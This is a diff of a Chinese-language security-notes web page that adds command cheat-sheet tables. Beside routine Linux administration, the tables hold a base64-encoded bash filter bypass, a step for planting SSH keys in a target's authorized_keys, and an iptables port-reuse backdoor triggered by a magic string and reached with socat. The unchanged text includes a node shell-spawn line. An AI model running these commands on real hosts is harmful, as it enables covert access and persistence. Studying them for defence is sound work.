@@ -108,6 +108,15 @@
 	
 					<ul>
 						<li class="file">
+							<a href="/SafetyAtlas/安全学习/暗网/">
+								<i class="fa fa-file"></i>
+								暗网
+							</a>
+						</li>
+					</ul>
+	
+					<ul>
+						<li class="file">
 							<a href="/SafetyAtlas/安全学习/论坛/">
 								<i class="fa fa-file"></i>
 								论坛
@@ -391,7 +400,31 @@
 <div id="article">
 	<p>在windows中，**-<strong>也可写作</strong>&#x2F;**</p>
 <p>windows大小写不敏感，linux大小写敏感</p>
-<h1 id="工具命令"><a href="#工具命令" class="headerlink" title="工具命令"></a>工具命令</h1><h2 id="Composer"><a href="#Composer" class="headerlink" title="Composer"></a>Composer</h2><p><strong>下载方式一：</strong></p>
+<h1 id="工具命令"><a href="#工具命令" class="headerlink" title="工具命令"></a>工具命令</h1><h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><table>
+<thead>
+<tr>
+<th>作用</th>
+<th>命令</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>可调用编码后的命令绕过限制</td>
+<td>&#96;bash -c {echo,xx}</td>
+<td>{base64,-d}</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="Composer"><a href="#Composer" class="headerlink" title="Composer"></a>Composer</h2><p><strong>下载方式一：</strong></p>
 <p>访问下方链接可下载php安装文件</p>
 <p>将php.exe添加至系统环境变量</p>
 <p>通过php.exe运行该文件后可下载composer.phar（不推荐）</p>
@@ -2939,6 +2972,25 @@
 <td></td>
 </tr>
 </tbody></table>
+<h3 id="公私钥"><a href="#公私钥" class="headerlink" title="公私钥"></a>公私钥</h3><table>
+<thead>
+<tr>
+<th>作用</th>
+<th>命令</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>生成公钥私钥文件</td>
+<td><code>ssh-keygen -t rsa</code></td>
+<td>默认路径如下<br>私钥：<code>/root/.ssh/id_rsa</code><br>公钥：<code>/root/.ssh/id_rsa.pub</code><br>把公钥存到目标主机的<code>/root/.ssh/authorized_keys</code>路径即可</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
 <h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><table>
 <thead>
 <tr>
@@ -2953,14 +3005,19 @@
 <td></td>
 </tr>
 <tr>
-<td></td>
-<td></td>
-<td></td>
+<td>非交互式创建用户</td>
+<td><code>useradd -m test</code><br><code>echo &quot;123456&quot; | passwd --stdin test</code></td>
+<td>用户test</td>
 </tr>
 <tr>
-<td></td>
-<td></td>
-<td></td>
+<td>终结用户的所有进程</td>
+<td>pkill -u test</td>
+<td>用户test</td>
+</tr>
+<tr>
+<td>删除用户</td>
+<td>userdel -r test</td>
+<td>用户test，<code>-r</code> 表示删除用户的同时，将其宿主目录和系统内与其相关的内容删除</td>
 </tr>
 </tbody></table>
 <h3 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h3><table>
@@ -3004,6 +3061,45 @@
 <td>node反弹shell</td>
 <td>sudo node -e ‘child_process.spawn(“&#x2F;bin&#x2F;bash”,{stdio:[0,1,2]})’</td>
 <td></td>
+</tr>
+</tbody></table>
+<h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><table>
+<thead>
+<tr>
+<th>作用</th>
+<th>命令</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查看防火墙运行状态</td>
+<td><strong>systemctl status firewalld.service</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>开启防火墙</td>
+<td><strong>systemctl start firewalld.service</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>检查当前的 IP 转发状态</td>
+<td><strong>sysctl net.ipv4.ip_forward</strong></td>
+<td>如果输出为 <strong>net.ipv4.ip_forward &#x3D; 0</strong>，表示 IP 转发功能被禁用</td>
+</tr>
+<tr>
+<td>修改内核参数来启用 IP 转发</td>
+<td>sudo sysctl -w net.ipv4.ip_forward&#x3D;1</td>
+<td>设置是临时的，在系统重启后会失效。</td>
+</tr>
+<tr>
+<td>端口复用</td>
+<td>iptables -t nat -N LETMEIN<br><br><strong>iptables -t nat  -A LETMEIN -p tcp -j REDIRECT –dport 80 –to-port 22</strong></td>
+<td>先创建一个端口复用链子 LETMEIN；<br>创建一个端口复用规则，用于将主机接收的 80 端口流量转发至 22 端口</td>
+</tr>
+<tr>
+<td>端口复用（执行数据可复用端口）</td>
+<td>iptables -A INPUT -p tcp -m string –string ‘threathunterleaving’ –algo bm -m rece<br><br>iptables -t nat -A PREROUTING -p tcp –dport 80 –syn -m recent –rcheck –seconds 3600</td>
+<td>包含特定字符串 ‘threathunterleaving’ 的 TCP 数据包，并从名为 “letmein” 的 <strong>recent</strong> 集合中移除这些数据包的源 IP 地址<br><br>对于到达主机的目标端口为 80 的 TCP SYN 包，检查源 IP 地址是否在 “letmein” 集合中，并且在最近的 3600 秒内已经加入。如果满足这些条件，将数据包跳转到 “LETMEIN” 链进行后续处理。<br><br><br><a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat/">socat官网</a><br>连接方式：<br>1. 先开启复用，<strong>echo threathuntercoming | socat - tcp:目标地址:80</strong><br>2. 连接SSH，<strong>ssh -p 80 root@目标地址</strong><br>3.关闭复用，<strong>echo threathunterleaving | socat - tcp:目标地址</strong></td>
 </tr>
 </tbody></table>
 <h2 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h2><table>
